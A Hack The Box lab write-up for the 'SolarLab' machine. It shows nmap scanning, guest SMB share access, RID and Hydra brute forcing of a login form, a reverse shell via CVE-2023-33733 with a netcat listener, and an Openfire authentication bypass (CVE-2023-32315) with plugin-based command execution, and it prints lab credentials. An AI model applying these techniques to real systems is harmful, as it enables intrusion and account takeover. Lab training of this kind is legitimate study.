# Solar Lab Write Up

# Intro
For this Hack the Box (HTB) machine, techniques such as Enumeration, user pivoting, and privaledge escalation were used in order to obtain both the user and root flags.

Below you can find of the tools that I used to complete this challenge
1. Kali Linux: An operating system that specializes in penetration testing.
2. Nmap: An open-source toolf for network exploration, along with security auditing
3. Crackmapexec: Automates the active directory of networks. THis can be used for Password Spraying, Credential Validation and Command Execution.
4. Hydra: A well known login cracker that is used for Brute Force Attacks.

I will go into detail regarding the steps taken. First we will go over the initial reconnaissance, identifying avenues of exploitation, exploitation foothold, then post exploitation.

### Initial Reconnisance
As with the first step of any HTB challenge, or penetration test, is to do a network scan. Below is a screenshot of the Nmap findings.

```bash
sudo nmap -sS -p- 10.10.11.16 -v

Nmap scan report for solarlab.htb (10.10.11.16)
Host is up (0.039s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
6791/tcp open  hnm

}
```

It is interesting to see that port 6791 is open. After research, I found that hnm is Halcyon Network Manager. With that I went to the page and saw a login page for a ReportLab/ReportHub login.

This will be usefull for later. In the meantime, port 445 was open and was explored in hopes of finding an exploit. Crackmapexec was used to make an attempt to log in as a guest via smb.

```bash
crackmapexec smb solarlab.htb -u Guest -p "" --shares

Results:

SMB         solarlab.htb    445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         solarlab.htb    445    SOLARLAB         [+] solarlab\Guest: 
SMB         solarlab.htb    445    SOLARLAB         [+] Enumerated shares
SMB         solarlab.htb    445    SOLARLAB         Share           Permissions     Remark
SMB         solarlab.htb    445    SOLARLAB         -----           -----------     ------
SMB         solarlab.htb    445    SOLARLAB         ADMIN$                          Remote Admin
SMB         solarlab.htb    445    SOLARLAB         C$                              Default share
SMB         solarlab.htb    445    SOLARLAB         Documents       READ            
SMB         solarlab.htb    445    SOLARLAB         IPC$            READ            Remote IPC

}
```

Suprisingly we don't need a password as a guest login, and we see that we have access to the share drive, along with some documents.


```bash
─(kali㉿kali)-[~]
└─$ smbclient //solarlab.htb/Documents -U Guest
Password for [WORKGROUP\Guest]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Fri Apr 26 10:47:14 2024
  ..                                 DR        0  Fri Apr 26 10:47:14 2024
  concepts                            D        0  Fri Apr 26 10:41:57 2024
  desktop.ini                       AHS      278  Fri Nov 17 05:54:43 2023
  details-file.xlsx                   A    12793  Fri Nov 17 07:27:21 2023
  My Music                        DHSrn        0  Thu Nov 16 14:36:51 2023
  My Pictures                     DHSrn        0  Thu Nov 16 14:36:51 2023
  My Videos                       DHSrn        0  Thu Nov 16 14:36:51 2023
  old_leave_request_form.docx         A    37194  Fri Nov 17 05:35:57 2023

smb: \> get details-file.xlsx
getting file \details-file.xlsx of size 12793 as details-file.xlsx (94.6 KiloBytes/sec) (average 94.6 KiloBytes/sec)

```
## Exploitation
After looking at the details-file.xlsx, we see that we have a list of logins, social security numbers, and various other personal details of the staff in Solar Labs.

*** Put picture here ***


Now that it is posible to access port 445 anonymously, we can use crackmapexec to brute force Relative Identifiers.

```bash
crackmapexec smb solarlab.htb -u anonymous -p '' --rid-brute

SMB         solarlab.htb    445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         solarlab.htb    445    SOLARLAB         [+] solarlab\anonymous: 
SMB         solarlab.htb    445    SOLARLAB         [+] Brute forcing RIDs
SMB         solarlab.htb    445    SOLARLAB         500: SOLARLAB\Administrator (SidTypeUser)
SMB         solarlab.htb    445    SOLARLAB         501: SOLARLAB\Guest (SidTypeUser)
SMB         solarlab.htb    445    SOLARLAB         503: SOLARLAB\DefaultAccount (SidTypeUser)
SMB         solarlab.htb    445    SOLARLAB         504: SOLARLAB\WDAGUtilityAccount (SidTypeUser)
SMB         solarlab.htb    445    SOLARLAB         513: SOLARLAB\None (SidTypeGroup)
SMB         solarlab.htb    445    SOLARLAB         1000: SOLARLAB\blake (SidTypeUser)
SMB         solarlab.htb    445    SOLARLAB         1001: SOLARLAB\openfire (SidTypeUser)


```

We see that blake si a user, of which we found his login information within the excel file. With this information, we should be able to brute force the ReportHub login via Hydra.


```bash
hydra -L /home/kali/wordlist/solarlab_user_word_list.txt -P /home/kali/wordlist/solarlabs_wl_pass.txt report.solarlab.htb -s 6791 http-post-form "/login:username=^USER^&password=^PASS^&enter=Login:User not found." -V

```
![hydra_screen_shot](https://github.com/theryeguy92/HTB-Solar-Lab/assets/103153678/046207b2-e0bb-42eb-b226-63143d9d38ca)

We get a list of usernames. Notice how they start with their name, and end in the capital of their last name. Now we will focus on Blake and brute force only his potential username/password.

```bash
hydra -l BlakeB -P /home/kali/wordlist/solarlabs_wl_pass.txt report.solarlab.htb -s 6791 http-post-form "/login:username=^USER^&password=^PASS^&enter=Login:User not found." -V

```

Now we are able to log into the ReportHub Dashboard.

![blakeb_dashboard](https://github.com/theryeguy92/HTB-Solar-Lab/assets/103153678/dcb4d6a1-d80f-405b-b22d-745acca5e1ea)

## Post-Exploitation

After some analysis, each of the options generate a pdf. There is a vulnrability (CVE-2023-33733) that will exploit the pdf generating ability, of which will allow us to get a reverse shell into the local network.

To do so, I simply used a reverse shell generator and plugged in the payload into the python script.

For simplicity, here are the steps used to get the reverse shell:

1. Used a Reverse Shell Generator: https://www.revshells.com/
2. Plug in the payload (illustrated below) in the python script: https://github.com/c53elyas/CVE-2023-33733
   ![payload_python](https://github.com/theryeguy92/HTB-Solar-Lab/assets/103153678/f1b423e7-747c-449f-9c06-c081c69fae6b)
3. After this set up, since Its possible to intercept, and alter the Training Request text and plug the malicious script.
   ![payload_packet intercept](https://github.com/theryeguy92/HTB-Solar-Lab/assets/103153678/73b59298-5761-4f65-8e3d-83f371a37b3d)
4. Before we Forward the response, we set up a listener on port 4444 (Or the port you set up a netcat listener).
```bash
sudo rlwrap nc -lnvp 4444

```

After completing these above steps, we not have a foothold within the network
![foothold_solar_lab](https://github.com/theryeguy92/HTB-Solar-Lab/assets/103153678/85edbe45-1b2f-405c-b131-1b6fb6ffce5c)


From our foothold, we see that we are logged in as the user blake

![whoami_blake](https://github.com/theryeguy92/HTB-Solar-Lab/assets/103153678/70c5dd34-2c3d-4730-9c7e-6d4a461426be)


## Foothold

With the foothold estabilished, we begin to explore directories. In doing so, we are able to capture the user flag.

![userflag_found](https://github.com/theryeguy92/HTB-Solar-Lab/assets/103153678/5ac39860-546c-421f-9c9c-14e967856df1)


In one of the directories, we discovered a user.db file. We can use the type command to get user login information.

![credentials_unlocked](https://github.com/theryeguy92/HTB-Solar-Lab/assets/103153678/a1369303-23a7-4c7b-a902-fd546592784e)

As this is not the most flattering snapshot, we can deduct the following information:

```
 user			    pass
 alexanderk		HotP!fireguard
 007poiuytrewq		claudias007
 blakeb			ThisCanB3typedeasily1@

```

However, in order to escalate our privaleges, we will have to pivot to another user. This is because Blake does not have root privleges.

When exploring, we discovered a user named openfire via the Get-LocalUser command. After some googling, we discover that openfire is a instant messaging and group chat server. The Services that Openfire provides run on ports 9090 and 9091.

I confirmed this via the command below, which gives us a IP and port of of 127.0.0.1:9090.
```
C:\users\blake\desktop> netstat -ano | findstr "9090"

  TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       2244

```
In order to get access to openfire, we will have to navigate to port 9090 or port 9091. We will have to tunnel via reverse port forwarding to those ports. To help us, Chisel is a great tool that helps with reverse port forwarding. We can simply clone the respratory from github, execute the build, then upload the windows.exe to execute the port forwarding.

![chisel build](https://github.com/theryeguy92/HTB-Solar-Lab/assets/103153678/99cb98ad-0103-44e1-bf88-1f8d752bfa14)

After we complete the build and installation, we will run the command below to open a reverse port forward from our machines side.

Attacker Machine (our Machine):

![port forward](https://github.com/theryeguy92/HTB-Solar-Lab/assets/103153678/61738fa0-309b-4995-9bfa-dedf125173cd)


Victim Machine (command hilighted below):
![port forward windows_final_cmd](https://github.com/theryeguy92/HTB-Solar-Lab/assets/103153678/ad4fc910-1c6f-4b68-93cc-4ea6408ab6ab)


Once we see a connection on the attacking machine's side, after typing localhost:9090 into a web browser we are greeted with an openfire login page.

![Openfire_login](https://github.com/theryeguy92/HTB-Solar-Lab/assets/103153678/ccdb2904-c4e5-4e6c-87b6-71243ddb8475)


Eventhough we don't have any leads regarding logins specific to a Openfire login, we can use an exploit via CVE-2023-32315 which can bypass the authentication.

![CVE_2023_32315](https://github.com/theryeguy92/HTB-Solar-Lab/assets/103153678/6c89ee42-5b9e-43fa-a5f6-9535b3141b0b)


Now we have a user name and password we can use to log into openfire.

![password for openfire via CVE_2023_3215](https://github.com/theryeguy92/HTB-Solar-Lab/assets/103153678/f842cc9a-1aa2-4bb1-9374-cb837859ece1)


Once we use our credentials we are greeted with the openfire GUI.

![openfire_we_are_in](https://github.com/theryeguy92/HTB-Solar-Lab/assets/103153678/046a66d4-a263-49ca-90d9-82444f688836)

For the exploit we just used. there is a .jar plugin that we can upload which will give us a server management tool. As we see, the default password is 123.

![upload vulnrable plugin](https://github.com/theryeguy92/HTB-Solar-Lab/assets/103153678/a865670a-67b3-4ae8-a756-1ad1a3d26dea)

The management tool can be found by going to the home GUI page, server -> server_setting -> management tools.

![openfire managment tool](https://github.com/theryeguy92/HTB-Solar-Lab/assets/103153678/726b789d-009f-4bc8-86a2-e49679d40f3e)

We can use the dropdown bar and select system command. Here we can execute commands like we could on the command prompt.

![result_of_system_command](https://github.com/theryeguy92/HTB-Solar-Lab/assets/103153678/aeb65987-09d1-48ea-852e-1c3e32701222)

We can use the same technique as we did before to get a reverse shell as blake. We will simply just use the reverse shell generator as we did above, plug it in the command GUI and use net cat as a listener.



We have officially pivoted from blake to openfire. After some inital exploring, I didn't see any interesting files. However unlike blake, we are able to use a file called RunasCs.exe. Essentially, we will be able to run commands that will be outside our normal permissions. From the password list we pulled from the excel, I kept on trying each one as Administrator until I got a hit.

Once confirmed, given how unstable the shell was for this lab, I searched for the root file to confirm that it was under the user Administrator.

![search for root](https://github.com/theryeguy92/HTB-Solar-Lab/assets/103153678/307e9c9e-bff4-4040-ba48-e3dfcf578682)

After confirmation, I ran another command as administrator to pull the rootflag.


![root_flag_copy](https://github.com/theryeguy92/HTB-Solar-Lab/assets/103153678/30a144ab-8751-4972-9089-d871b5e2a5ce)











